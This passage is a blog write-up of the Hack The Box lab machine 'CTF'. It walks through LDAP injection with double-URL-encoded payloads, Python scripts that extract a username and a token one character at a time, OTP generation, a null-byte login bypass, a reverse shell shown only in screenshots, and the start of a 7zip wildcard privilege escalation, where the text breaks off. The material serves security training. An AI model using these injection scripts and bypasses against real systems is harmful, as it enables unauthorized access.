@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>HTB - CTF :: squ4r00t&#39;s</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup for the &#39;Insane&#39; rated machine: CTF" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="http://localhost:1313/writeups/ctf/" />
+
+
+  
+
+
+
+
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/header.min.b246f77a68a20a42410f6ef10f5a4c0355e44a1e6161b71356c92d912d3ad1d2.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/main.min.2b8cac7ecb4eaf88191c1f3696aa0642a060b51a860216ac63ce253fb11ff3da.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="icon" type="image/png" href="/img/favicons/favicon-96x96.png" sizes="96x96" />
+<link rel="icon" type="image/svg+xml" href="/img/favicons/favicon.svg" />
+<link rel="shortcut icon" href="/img/favicons/favicon.ico" />
+<link rel="apple-touch-icon" sizes="180x180" href="/img/favicons/apple-touch-icon.png" />
+<link rel="manifest" href="/img/favicons/site.webmanifest" />
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB - CTF">
+<meta property="og:description" content="Writeup for the &#39;Insane&#39; rated machine: CTF" />
+<meta property="og:url" content="http://localhost:1313/writeups/ctf/" />
+<meta property="og:site_name" content="squ4r00t&#39;s" />
+
+  <meta property="og:image" content="http://localhost:1313/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2025-04-30 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    
+    
+    
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/posts">blog</a></li>
+        
+      
+        
+          <li><a href="/writeups">writeups</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/posts" >blog</a></li>
+        
+      
+        
+          <li><a href="/writeups" >writeups</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="http://localhost:1313/writeups/ctf/">HTB - CTF</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2025-04-30</time></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="http://localhost:1313/tags/htb/">htb</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/linux/">linux</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/insane/">insane</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/ldap_injection/">ldap_injection</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/stoken/">stoken</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/otp_bypass/">otp_bypass</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/7z_privesc/">7z_privesc</a>&nbsp;
+      
+    </span>
+  
+  
+  <img src="/writeups/ctf/cover.png"
+    class="post-cover"
+    alt="HTB - CTF"
+    title="Cover Image" />
+
+
+  
+    <div class="table-of-contents">
+      <h2>
+        Table of Contents
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#port-scan-results">Port Scan Results</a></li>
+    <li><a href="#website">Website</a>
+      <ul>
+        <li><a href="#testing-for-ldap-injection">Testing for LDAP Injection</a></li>
+        <li><a href="#username-enumeration">Username enumeration</a></li>
+        <li><a href="#attribute-enumeration">Attribute enumeration</a></li>
+        <li><a href="#token-leak">Token leak</a></li>
+        <li><a href="#otp-generation">OTP Generation</a></li>
+        <li><a href="#command-execution">Command execution</a></li>
+      </ul>
+    </li>
+    <li><a href="#privesc">Privesc</a>
+      <ul>
+        <li><a href="#apache---ldapuser">apache -&gt; ldapuser</a></li>
+        <li><a href="#ldapuser---root">ldapuser -&gt; root</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <p>CTF is an insane difficulty Linux box with a web application using LDAP based authentication. The application is vulnerable to LDAP injection but due to character blacklisting the payloads need to be double URL encoded. After enumeration, a token string is found, which is obtained using boolean injection. Using the token an OTP can be generated, which allows for execution of commands. After establishing a foothold, a cron can be exploited to gain sensitive information.</p>
+<h2 id="port-scan-results">Port Scan Results<a href="#port-scan-results" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>From the results of the nmap scan, we see that we have 2 ports open: 22 and 80</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: CTF
+</span></span></code></pre></div><h2 id="website">Website<a href="#website" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Navigating to <code>http://10.10.10.122</code>, we get this page telling us about a token-based (software tokens specifically) authentication system to be tested:</p>
+<figure><img src="/img/htb/ctf/homepage.png"
+    alt="Home Page"><figcaption>
+      <p>Home Page</p>
+    </figcaption>
+</figure>
+
+<p>We are also informed that bruteforcing attempts may result in a 5 minute ban. Banned ip will be available at <code>/status.php</code>:</p>
+<figure><img src="/img/htb/ctf/status.php.png"
+    alt="List of banned IPs"><figcaption>
+      <p>List of banned IPs</p>
+    </figcaption>
+</figure>
+
+<p>We have a login page at <code>/login.php</code>:</p>
+<figure><img src="/img/htb/ctf/loginpage.png"
+    alt="Login page"><figcaption>
+      <p>Login page</p>
+    </figcaption>
+</figure>
+
+<p>If we try basic credentials such as <code>admin:1234</code>, we get the following response:</p>
+<figure><img src="/img/htb/ctf/admin_not_found.png"
+    alt="Response for admin:1234"><figcaption>
+      <p>Response for admin:1234</p>
+    </figcaption>
+</figure>
+
+<p>Looking at the source page, we see the following comment under the OTP input field:</p>
+<figure><img src="/img/htb/ctf/source_page_comment.png"
+    alt="Comment in the login page source"><figcaption>
+      <p>Comment in the login page source</p>
+    </figcaption>
+</figure>
+
+<p>Knowing that the token string is stored in an &ldquo;attribute&rdquo;, we can make the assumption that the authentication system is based on LDAP.</p>
+<h3 id="testing-for-ldap-injection">Testing for LDAP Injection<a href="#testing-for-ldap-injection" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>Testing for LDAP Injection would help us validate our hypothesis that the website is using LDAP and potentially bypass the authentication system.</p>
+<p>First, we can try to send characters that are specific to LDAP&rsquo;s syntax. For example, the <code>*</code> (wilcard) character:</p>
+<figure><img src="/img/htb/ctf/wc_char_noenc.png"
+    alt="Sending the * character with no encoding"><figcaption>
+      <p>Sending the * character with no encoding</p>
+    </figcaption>
+</figure>
+
+<p>Sending the <code>*</code> character does not return any error message. This indicates that some characters are maybe filtered before reaching the application logic.</p>
+<p>If that&rsquo;s the case we can try URL-encoding them:</p>
+<figure><img src="/img/htb/ctf/wc_char_enc1.png"
+    alt=" character URL-encoded once "><figcaption>
+      <p><ul>
+<li>character URL-encoded once</li>
+</ul>
+</p>
+    </figcaption>
+</figure>
+
+<figure><img src="/img/htb/ctf/wc_char_enc2.png"
+    alt=" character double URL-encoded "><figcaption>
+      <p><ul>
+<li>character double URL-encoded</li>
+</ul>
+</p>
+    </figcaption>
+</figure>
+
+<p>When we double URL-encoded our payload, we got a different response: &ldquo;Cannot login&rdquo;.</p>
+<p>Earlier, when we tried admin we got the response: &ldquo;User admin not found&rdquo;</p>
+<p>This means we got a valid user by using the <code>*</code> character. Knowing this, and leveraging the difference between the 2 responses, we can retrieve a username character by character.</p>
+<h3 id="username-enumeration">Username enumeration<a href="#username-enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>This is how we&rsquo;ll retrieve the username:</p>
+<ul>
+<li>First we send <code>a*</code> as the username. If we get the message &ldquo;Cannot login&rdquo;, then we know that the first letter is &lsquo;a&rsquo;. If we don&rsquo;t, we move on to the letter &lsquo;b&rsquo; by sending <code>b*</code>, so on and so forth.</li>
+<li>Let&rsquo;s say that we confirmed that the first letter is &lsquo;a&rsquo;. Now we repeat the process for the second letter by sending <code>aa*</code></li>
+<li>We repeat this process until we get the full username.</li>
+</ul>
+<p>For this, we can use this python script:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">letters</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://10.10.10.122/login.php&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">guess_next_char</span><span class="p">(</span><span class="n">current_guessed_string</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">letter</span> <span class="ow">in</span> <span class="n">letters</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;inputUsername&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">current_guessed_string</span><span class="si">}{</span><span class="n">letter</span><span class="si">}</span><span class="s2">%2a&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;inputOTP&#34;</span><span class="p">:</span> <span class="s2">&#34;1234&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;Cannot login&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">letter</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;END&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">+=</span> <span class="n">guess_next_char</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+</span></span></code></pre></div><figure><img src="/img/htb/ctf/ldapuser_guess.png"
+    alt="Script running"><figcaption>
+      <p>Script running</p>
+    </figcaption>
+</figure>
+
+<p>The script returned the username <code>ldapuser</code>. We can confirm it by trying it on the login page:</p>
+<figure><img src="/img/htb/ctf/confirm_ldapuser.png"
+    alt="Confirmation"><figcaption>
+      <p>Confirmation</p>
+    </figcaption>
+</figure>
+
+<p>Now that we have a valid username, we need to know the OTP.</p>
+<p>Referring to the comment we found earlier, the token is stored in one of the attribute. However we don&rsquo;t know which one that is. We can use the LDAP injection in order to fuzz for different attributes and see which one contains the token.</p>
+<h3 id="attribute-enumeration">Attribute enumeration<a href="#attribute-enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>We can use <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP_attributes.txt">this LDAP attributes wordlist</a> from PayloadsAllTheThings:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">c
+</span></span><span class="line"><span class="cl">cn
+</span></span><span class="line"><span class="cl">co
+</span></span><span class="line"><span class="cl">commonName
+</span></span><span class="line"><span class="cl">dc
+</span></span><span class="line"><span class="cl">facsimileTelephoneNumber
+</span></span><span class="line"><span class="cl">givenName
+</span></span><span class="line"><span class="cl">gn
+</span></span><span class="line"><span class="cl">homePhone
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl">jpegPhoto
+</span></span><span class="line"><span class="cl">l
+</span></span><span class="line"><span class="cl">mail
+</span></span><span class="line"><span class="cl">mobile
+</span></span><span class="line"><span class="cl">name
+</span></span><span class="line"><span class="cl">o
+</span></span><span class="line"><span class="cl">objectClass
+</span></span><span class="line"><span class="cl">ou
+</span></span><span class="line"><span class="cl">owner
+</span></span><span class="line"><span class="cl">pager
+</span></span><span class="line"><span class="cl">password
+</span></span><span class="line"><span class="cl">sn
+</span></span><span class="line"><span class="cl">st
+</span></span><span class="line"><span class="cl">surname
+</span></span><span class="line"><span class="cl">uid
+</span></span><span class="line"><span class="cl">username
+</span></span><span class="line"><span class="cl">userPassword
+</span></span></code></pre></div><p>Assuming that the LDAP logic in the backend looks like the following:</p>
+<pre tabindex="0"><code class="language-ldap" data-lang="ldap">(&amp;
+  (username=&lt;USERINPUT&gt;)
+  (otp=&lt;USERINPUT&gt;)
+)
+</code></pre><p>We can try to breakout of one of the conditions and add our own which will contain the attribute we are testing the existence of.</p>
+<p>This can be done by sending something like <code>ldapuser)(attribute=*</code> as the username (double URL-encoded).</p>
+<p>This will then result in the following &ldquo;hypothetical&rdquo; query:</p>
+<pre tabindex="0"><code class="language-ldap" data-lang="ldap">(&amp;
+  (username=ldapuser)
+  (attribute=*)
+  (otp=&lt;USERINPUT&gt;)
+)
+</code></pre><p>If the attribute doesn&rsquo;t exist we won&rsquo;t get the &ldquo;Cannot login&rdquo; error message.</p>
+<p>Using burp intruder, we can fuzz every attribute in our wordlist and see for which ones we get &ldquo;Cannot login&rdquo; in the response</p>
+<figure><img src="/img/htb/ctf/attribute_fuzzing_intruder.png"
+    alt="Setting up Burp Intruder"><figcaption>
+      <p>Setting up Burp Intruder</p>
+    </figcaption>
+</figure>
+
+<figure><img src="/img/htb/ctf/valid_attributes.png"
+    alt="Valid LDAP attributes"><figcaption>
+      <p>Valid LDAP attributes</p>
+    </figcaption>
+</figure>
+
+<p>Among this list of valid attributes, <code>pager</code> seems to be a good candidate for containing a 81 digits token. We can verify it by using the same method as we did in the username enumeration.</p>
+<h3 id="token-leak">Token leak<a href="#token-leak" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>We can use a slightly modified version of the previous script:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">letters</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">digits</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="s2">&#34;1234567890&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://10.10.10.122/login.php&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">guess_next_char</span><span class="p">(</span><span class="n">current_guessed_string</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">digit</span> <span class="ow">in</span> <span class="n">digits</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;inputUsername&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;ldapuser%29%28pager%3d</span><span class="si">{</span><span class="n">current_guessed_string</span><span class="si">}{</span><span class="n">digit</span><span class="si">}</span><span class="s2">%2a&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;inputOTP&#34;</span><span class="p">:</span> <span class="s2">&#34;1234&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;Cannot login&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">digit</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;END&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">token</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">token</span> <span class="o">+=</span> <span class="n">guess_next_char</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+</span></span></code></pre></div><figure><img src="/img/htb/ctf/token_brute_start.png"
+    alt="Start of the attack"><figcaption>
+      <p>Start of the attack</p>
+    </figcaption>
+</figure>
+
+<figure><img src="/img/htb/ctf/token_brute_end.png"
+    alt="Brute Force finished"><figcaption>
+      <p>Brute Force finished</p>
+    </figcaption>
+</figure>
+
+<h3 id="otp-generation">OTP Generation<a href="#otp-generation" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>From the token we obtained previously, we need to generate a valid OTP which we can use to login. For this we can use  the command line tool: <code>stoken</code> (It was mentionned on the home page that the authentication was based on <a href="https://manpages.ubuntu.com/manpages/focal/man1/stoken.1.html">Software Tokens</a>)</p>
+<blockquote>
+<p>Before running the tool, we need to make sure that our clock is synchronized with the server&rsquo;s or use a time offset</p>
+</blockquote>
+<pre tabindex="0"><code>stoken --token=285449490011372370317401734215712056720371131272577450204172154164546722716756524 --pin=0000
+</code></pre><p>After submitting the login request with the generated OTP, we are redirected to the following page <code>/page.php</code>:</p>
+<figure><img src="/img/htb/ctf/page.php.png"
+    alt="/page.php"><figcaption>
+      <p>/page.php</p>
+    </figcaption>
+</figure>
+
+<h3 id="command-execution">Command execution<a href="#command-execution" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>If we try to run a command, we receive this error message:</p>
+<figure><img src="/img/htb/ctf/cmd_error_message.png"
+    alt="Cannot run commands"><figcaption>
+      <p>Cannot run commands</p>
+    </figcaption>
+</figure>
+
+<p>This is means that there is a group membership check that is done. So in order to execute commands we&rsquo;ll either have to get access to a more privileged account or somehow bypass the group membership check.</p>
+<p>We can try to do the latter by injecting a NULL byte (<code>0x00</code>) character after closing the ldap query.</p>
+<p>For that we&rsquo;ll first send <code>ldapuser)%00</code> as the username and increase the number of parenthesis until we close the query.</p>
+<figure><img src="/img/htb/ctf/null_byte_1.png"
+    alt="With 1 parenthesis"><figcaption>
+      <p>With 1 parenthesis</p>
+    </figcaption>
+</figure>
+
+<figure><img src="/img/htb/ctf/null_byte_2.png"
+    alt="With 2 parenthesis"><figcaption>
+      <p>With 2 parenthesis</p>
+    </figcaption>
+</figure>
+
+<figure><img src="/img/htb/ctf/null_byte_3.png"
+    alt="With 3 parenthesis"><figcaption>
+      <p>With 3 parenthesis</p>
+    </figcaption>
+</figure>
+
+<p>So we need 3 parenthesis to close the query. Now, we can try to login with <code>ldapuser)))%00</code> and a valid OTP and see if we bypass the group membership check.</p>
+<figure><img src="/img/htb/ctf/null_byte_login.png"
+    alt="Login with null byte injection"><figcaption>
+      <p>Login with null byte injection</p>
+    </figcaption>
+</figure>
+
+<p>We logged in successfully with the null byte injection.</p>
+<figure><img src="/img/htb/ctf/run_cmd_id.png"
+    alt="Running the &amp;lsquo;id&amp;rsquo; command"><figcaption>
+      <p>Running the &lsquo;id&rsquo; command</p>
+    </figcaption>
+</figure>
+
+<p>Now we are able to run commands, we can therefore get a reverse shell:</p>
+<figure><img src="/img/htb/ctf/revshell_cmd.png"
+    alt="Executing the reverse shell"><figcaption>
+      <p>Executing the reverse shell</p>
+    </figcaption>
+</figure>
+
+<figure><img src="/img/htb/ctf/revshell_caught.png"
+    alt="Catching the reverse shell"><figcaption>
+      <p>Catching the reverse shell</p>
+    </figcaption>
+</figure>
+
+<h2 id="privesc">Privesc<a href="#privesc" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h3 id="apache---ldapuser">apache -&gt; ldapuser<a href="#apache---ldapuser" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>Looking at the files of the website, we find credentials for <code>ldapuser</code> in <code>/var/www/html/login.php</code>:</p>
+<p><img src="/img/htb/ctf/ldapuser_creds.png"></p>
+<p>We can use them to login as <code>ldapuser</code> via ssh and retrieve the user flag:</p>
+<p><img src="/img/htb/ctf/user.txt.png"></p>
+<h3 id="ldapuser---root">ldapuser -&gt; root<a href="#ldapuser---root" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>Under <code>/backup</code>, we can see different archives with timestamps in their name. Looking at the last modified date, we see they are each separated by a minute.</p>
+<p>This indicates that there might be a cron job running every minute.</p>
+<p>We also have a <code>error.log</code> file running every minute which is empty. And a bash script called <code>honeypot.sh</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># get banned ips from fail2ban jails and update banned.txt</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds)</span>
+</span></span><span class="line"><span class="cl">/usr/sbin/ipset list <span class="p">|</span> grep fail2ban -A <span class="m">7</span> <span class="p">|</span> grep -E <span class="s1">&#39;[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}&#39;</span> <span class="p">|</span> sort -u &gt; /var/www/html/banned.txt
+</span></span><span class="line"><span class="cl"><span class="c1"># awk &#39;$1=$1&#39; ORS=&#39;&lt;br&gt;&#39; /var/www/html/banned.txt &gt; /var/www/html/testfile.tmp &amp;&amp; mv /var/www/html/testfile.tmp /var/www/html/banned.txt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># some vars in order to be sure that backups are protected</span>
+</span></span><span class="line"><span class="cl"><span class="nv">now</span><span class="o">=</span><span class="k">$(</span>date +<span class="s2">&#34;%s&#34;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">filename</span><span class="o">=</span><span class="s2">&#34;backup.</span><span class="nv">$now</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">pass</span><span class="o">=</span><span class="k">$(</span>openssl passwd -1 -salt 0xEA31 -in /root/root.txt <span class="p">|</span> md5sum <span class="p">|</span> awk <span class="s1">&#39;{print $1}&#39;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># keep only last 10 backups</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /backup
+</span></span><span class="line"><span class="cl">ls -1t *.zip <span class="p">|</span> tail -n +11 <span class="p">|</span> xargs rm -f
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># get the files from the honeypot and backup &#39;em all</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /var/www/html/uploads
+</span></span><span class="line"><span class="cl">7za a /backup/<span class="nv">$filename</span>.zip -t7z -snl -p<span class="nv">$pass</span> -- *
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># cleaup the honeypot</span>
+</span></span><span class="line"><span class="cl">rm -rf -- *
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># comment the next line to get errors for debugging</span>
+</span></span><span class="line"><span class="cl">truncate -s <span class="m">0</span> /backup/error.log
+</span></span></code></pre></div><p>Essentially this script will use 7zip to backup the contents of the <code>/var/www/html/uploads</code> directory. However the command uses a wildcard. We can use this in order to read files we don&rsquo;t have read access for.</p>
+<p>That is possible because with 7zip we can provide listfiles as arguments like this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">7z @myfile
+</span></span></code></pre></div><p>Then 7zip will get the file with the name <code>myfile</code> and read its content. This file should contain a list of all the files we want to archive. It could look like this:</p>
